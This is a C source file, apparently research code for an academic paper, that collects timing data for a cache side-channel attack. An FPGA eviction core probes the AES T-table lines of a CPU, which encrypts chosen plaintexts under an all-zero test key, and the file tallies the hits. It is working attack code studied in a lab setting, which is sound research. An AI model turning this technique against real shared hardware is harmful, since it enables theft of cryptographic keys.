/**
 * @file data_collection_paper.c
 * @author Matteo Oldani
 * @version 0.1
 * @date 2023-01-18
 * 
 * This code implements the data collection for the 
 * write side channel attack on the FPGA to CPU threat model
 * 
 */

#include <stdio.h>
#include "platform.h"
#include "xil_printf.h"
#include <xside_channel_finder.h>
#include "aes.h"

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define STRIDE 1

void xil_printf_colored(unsigned value){
    if(value <= 12){
        xil_printf(ANSI_COLOR_GREEN);
        xil_printf("%u  ", value);
        xil_printf(ANSI_COLOR_RESET);
    }else{
        xil_printf("%d  ", value);
    }
}

void rand_ptxt(unsigned char *ptxt, int exclude){
    for(int i=0; i<16; i++){
        if(i==exclude){continue;}
        ptxt[i] = (unsigned char)(rand()%256);
    }
}


int main()
{

    volatile unsigned results[1024];
    unsigned int attack_results[257*256];
    XSide_channel_finder evicter;

    init_platform();

    volatile uint32_t * array = (te0);

    unsigned char key[16]  = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    unsigned char ptxt[16] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    unsigned char ctxt[16];

    int n = 256;

    for(int i=0; i<256; i++){
        for(int j=0; j<256; j++){
            attack_results[i*n + j] = 0;
        }
    }

    xil_printf("\e[1;1H\e[2J");
    xil_printf(ANSI_COLOR_YELLOW);
    xil_printf("################ STARTING THE ATTACK ################\n\n\r");
    xil_printf(ANSI_COLOR_RESET);

    xil_printf("The address of te0 is: 0x%p\n\r", te0);
    xil_printf("The address of te1 is: 0x%p\n\r", te1);
    xil_printf("The address of te2 is: 0x%p\n\r", te2);
    xil_printf("The address of te3 is: 0x%p\n\r", te3);

    int number_of_eviction = 257;

    XSide_channel_finder_Initialize(&evicter, 0);
    XSide_channel_finder_Set_c_results(&evicter, (UINTPTR) results);
    XSide_channel_finder_Set_array_r(&evicter, (UINTPTR) array);

    // Loop over all the addresses
    for(int a=0; a<257; a++){

        // Loop over all the possible plain texts
        for(int b=0; b<256; b++){
            xil_printf("%d %d\r", a, b);

            ptxt[0] = b;
            rand_ptxt(ptxt, 0);

            // EVICT
            for(int i=0; i<number_of_eviction; i++){
                results[257] = STRIDE * 4;
                results[258] = i;
                XSide_channel_finder_Start(&evicter);
                while(!XSide_channel_finder_IsDone(&evicter));
            }

            encrypt(key, ptxt, ctxt);

            // Get data from attacker
            for(int i=0; i<number_of_eviction; i++){
                results[257] = STRIDE * 4;
                results[258] = i;

                encrypt(key, ptxt, ctxt);

                XSide_channel_finder_Start(&evicter);
                while(!XSide_channel_finder_IsDone(&evicter));
            }

            // Check timings
            for(int i=1; i<257; i++){
                if(results[i] >14){
                    attack_results[(i-1)*n+b] +=1;
                }
            }
        }
    }

    xil_printf("\n\r");
    for(int i=0; i<256; i++){
        for(int j=0; j<256; j++){
            xil_printf("%d ", attack_results[i*n + j]);
        }
        xil_printf("\n\r");
    }

    cleanup_platform();
    return 0;
}
